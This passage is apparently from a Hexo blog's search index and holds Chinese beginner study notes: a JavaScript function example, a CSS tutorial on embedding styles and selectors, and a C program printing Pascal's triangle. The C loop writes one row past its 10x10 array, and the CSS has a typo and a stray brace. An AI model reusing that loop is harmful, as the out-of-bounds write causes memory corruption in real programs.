+ b; <span class="comment">//返回计算结果!</span></span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">// 调用函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">var</span> result = <span class="title function_">mysum</span>(<span class="number">10</span>, <span class="number">20</span>);</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(result)</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">   <span class="comment">//定义一个函数</span></span></span><br><span class="line"><span class="language-javascript">   <span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params">username</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="title function_">alert</span>(<span class="string">&quot;欢迎&quot;</span> + username + <span class="string">&quot;光临！&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在事件句柄当中调用sayHello函数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;sayHello(&#x27;李四&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS学习笔记</title>
      <link href="/2023/03/07/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/07/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="承接HTML学习笔记"><a href="#承接HTML学习笔记" class="headerlink" title="承接HTML学习笔记"></a>承接HTML学习笔记</h1><p>附上动力节点网课视频</p><h2 id="CSS概述和在HTML中嵌入CSS样式的三种方式"><a href="#CSS概述和在HTML中嵌入CSS样式的三种方式" class="headerlink" title="CSS概述和在HTML中嵌入CSS样式的三种方式"></a>CSS概述和在HTML中嵌入CSS样式的三种方式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS概述<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>什么是CSS？<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span>  CSS:Cascading Style Sheet(层叠样式语言).CSS是一种样式表语言。专门用来修饰HTML页面的。让HTML页面更好看。</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span>  CSS是HTML的化妆品.CSS是离不开HTML的，CSS离开了HTML就没有意义了，所以还是新建HTML文件，编写HTML代码，HTML代码中编写央视，修饰HTML节点。</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>在HTML嵌入CSS样式的第一种方式<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--内联定义--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--盒子--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">内联定义的语法格式：</span></span><br><span class="line"><span class="comment">&lt;标签 style=&quot;样式名：样式值;样式名：样式值&quot;&gt;&lt;/标签&gt;</span></span><br><span class="line"><span class="comment">样式可通过查找帮助文档来获取</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;height: 100px;background-color: #66FF66;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>在HTML嵌入CSS样式的第二种方式<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--样式块对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 这是CSS的注释*(与HTML不同) */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 设置id=&quot;div2&quot;元素的宽度高度和颜色 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-css">设置某个元素的样式，首先你要选中这个元素，怎么选中一个或多个元素呢？</span></span></span><br><span class="line"><span class="comment"><span class="language-css">常见的选择元素的方式有三种：（这里说的是常见的）</span></span></span><br><span class="line"><span class="comment"><span class="language-css">id选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">标签选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">类选择器</span></span></span><br><span class="line"><span class="comment"><span class="language-css">*/</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 关于id选择器 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* id选择器只能作用于当前页面的一个节点，因为id是不能重复的 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#div2</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: greenyellow;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 标签选择器 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 作用于当前页面中所有的input元素 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* border-color: red;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">border-style: dashed;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">border-width: 1px; */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 总样式 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">1px</span> solid black;<span class="comment">/* 宽度 样式 颜色 */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* id选择器的优先级比标签选择器高 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#email</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">20px</span> dashed red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 类选择器 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.student</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: <span class="number">#0000FF</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 以上三种选择器的优先级</span></span></span><br><span class="line"><span class="comment"><span class="language-css">id选择器&gt;类选择器&gt;标签选择器 */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">邮箱地址：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 在HTML中，任何一个节点元素都有class属性，用来指定标签类名--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--以下虽然标签不同，但是它们的都属于同一类。为什么？因为类名相同--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>在HTML嵌入CSS样式的第三种方式<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入外部独立的CSS样式表文件--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--实际开发中较多使用这种方式，可以降低维护成本，修改一个文件即可--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;C:/Users/yxz/Desktop/css/my.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>附.css文件代码</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#div1</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#ADFF2F</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line"><span class="attribute">position</span>: absolute; <span class="comment">/* 绝对定位 */</span></span><br><span class="line"><span class="comment">/* 绝对定位的时候只要设置x轴和y轴坐标即可 */</span></span><br><span class="line"><span class="attribute">top</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">500px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#div2</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">background</span>: red;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span><br><span class="line"><span class="attribute">position</span>: absolute; <span class="comment">/* 绝对定位 */</span></span><br><span class="line"><span class="attribute">top</span>: <span class="number">300px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">600px</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/07/AH8Xvk5FiMraCQL.png" alt="css.png"></p><h3 id="常见CSS样式"><a href="#常见CSS样式" class="headerlink" title="常见CSS样式"></a>常见CSS样式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>常用的CSS样式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--样式块--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.numbers</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">display</span>: none; <span class="comment">/*  block */</span> </span></span><br><span class="line"><span class="language-css"><span class="comment">/* </span></span></span><br><span class="line"><span class="comment"><span class="language-css">display样式</span></span></span><br><span class="line"><span class="comment"><span class="language-css">1.属于布局样式</span></span></span><br><span class="line"><span class="comment"><span class="language-css">2.用来设置显示或者隐藏</span></span></span><br><span class="line"><span class="comment"><span class="language-css">3.隐藏：none</span></span></span><br><span class="line"><span class="comment"><span class="language-css">4.显示：block或者inline-bloc</span></span></span><br><span class="line"><span class="comment"><span class="language-css">block：以块的形式展现，并且独自占用一行</span></span></span><br><span class="line"><span class="comment"><span class="language-css">inline-block：以块的形式展现，但是不会自己独自占用一行</span></span></span><br><span class="line"><span class="comment"><span class="language-css">*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#nameError</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">font-size</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.baidu</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">text-decoration</span>: none;<span class="comment">/* underline */</span></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#cc</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">list-style-type</span>: noen;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* :hover专门用来设置鼠标悬停效果的 */</span></span></span><br><span class="line"><span class="language-css"><span class="comment">/*使用hover的时候:俩边不能出现空格*/</span></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#bgpowernode</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css"><span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-class">.div5</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: <span class="number">#444</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">34px</span> red solid;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 在元素外边打补丁 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">margin-top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">margin-left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 内补丁 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">padding-right</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#outdiv</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: blue;</span></span><br><span class="line"><span class="language-css"><span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#innerdiv</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 设置当前节点元素的浮动效果，只是浮动于当前元素的父元素内部 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-id">#mydiv2</span> &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css"><span class="comment">/* 绝对定位 */</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css"><span class="attribute">top</span>: <span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置鼠标悬停效果--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--鼠标移动到以下文本上，字体颜色变红，鼠标变小手--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;bgpowernode&quot;</span>&gt;</span>柚子皮<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;cc&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>a</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;numbers&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>b</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;numbers&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>c</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;numbers&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--字体样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;nameError&quot;</span>&gt;</span>用户名不能为空<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文本装饰--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;baidu&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http:www.baidu.com&quot;</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--内补丁，外补丁--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;div5&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--浮动效果--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;outdiv&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;innerdiv&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mydiv2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/09/VpQUdCGtHbAniZ8.png" alt="image.png"></p><h3 id="暂停于此"><a href="#暂停于此" class="headerlink" title="暂停于此"></a>暂停于此</h3>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C的笔记</title>
      <link href="/2023/03/05/C%E7%9A%84%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/05/C%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h3><p>数组要初始化<br>找规律</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 1 1</span></span><br><span class="line"><span class="comment">// 1 2 1</span></span><br><span class="line"><span class="comment">// 1 3 3 1</span></span><br><span class="line"><span class="comment">// 1 4 6 4 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>][<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//第一列全1</span></span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对角线全1</span></span><br><span class="line">            <span class="keyword">if</span> (i == j)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">2</span> &amp;&amp; j &gt;= <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                arr[i][j] = arr[i <span class="number">-1</span>][j - <span class="number">1</span>] + arr[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/CD8iWgf2mlQUz5G.png" alt="杨辉三角.png"></p><h3 id="凶杀案"><a href="#凶杀案" class="headerlink" 